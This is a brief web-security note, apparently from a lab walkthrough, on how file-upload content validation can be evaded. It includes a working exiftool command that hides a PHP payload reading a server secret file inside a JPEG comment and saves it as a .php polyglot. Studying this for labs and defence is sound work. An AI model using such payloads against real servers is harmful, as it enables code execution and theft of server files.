## **Flawed validation of the file's contents**

Servers wont just check content-type in request, for example if is an image, it’ll check it’s dimension. So we can’t pass a php one-liner code in content.

Some file type contains specific header/footer bytes, for example JPEG files always begin with the bytes `FF D8 FF`.

This can also be modified using exiftool

```sql
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

```

This command will create a image format and store the payload in it as comment, and the extension will be .php (which can be bypassed on the server)
